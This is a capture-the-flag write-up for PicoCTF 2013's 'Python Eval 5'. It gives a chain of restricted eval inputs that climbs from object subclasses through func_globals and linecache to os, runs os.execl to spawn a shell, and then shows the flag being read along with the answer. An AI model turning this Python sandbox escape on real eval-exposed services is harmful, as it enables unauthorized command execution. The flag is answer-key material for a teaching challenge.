# PicoCTF 2013: Python Eval 5

**Category:** Script Exploitation
**Points:** 140
**Description:**

> A true challenge awaits you at python.picoctf.com:6365. [Source](https://2013.picoctf.com/problems/pyeval/task5.py).

## Write-up

> This challenge is very simliar to Python Eval 3. We're given a Python script to exploit and the task of getting a shell on the server running it ; in order to read the flag.
> The script's author has removed the ability to call __builtins__ and have given us a dictionary with an empty variable 'x'.
> They also have limited us to 50 chars of eval at a time.
> Our approache to solving this will be to use the empty variable 'x''s builtins to exploit this script.
> The follwing commands give us our shell.

```
__builtins__[0]=x.__class__.__base__
__builtins__[1]=__builtins__[0].__subclasses__
__builtins__[2]=__builtins__[1]()
__builtins__[3]=__builtins__[2][53]
__builtins__[4]=__builtins__[3].__repr__
__builtins__[5]=__builtins__[4].im_func
__builtins__[6]=__builtins__[5].func_globals
__builtins__[7]=__builtins__[6]['linecache']
__builtins__[8]=__builtins__[7].os
__builtins__[8].execl('/bin/sh','sh')
```

> The first six lines of input give us access to *im_func* 's functions. One of those functions is the func_globals function. The func_globals function returns a dictionary of a modules global scope.
> The next two lines calls func_globals with the argument of the module linecache. The linecache module has the module os module in scope.
> We use the last two lines to use the module os to call a shell. 

Finally using our shell gives us the answer
```
ls
flag_for_masters
run.sh
task5.py
cat flag_for_masters
you_are_the_pyeval_master
```

**Answer: you_are_the_pyeval_master** 

## Other write-ups and resources

* [http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-5.html](http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-5.html)
* [http://haeresy.tumblr.com/post/49832621763/python-eval-5](http://haeresy.tumblr.com/post/49832621763/python-eval-5)
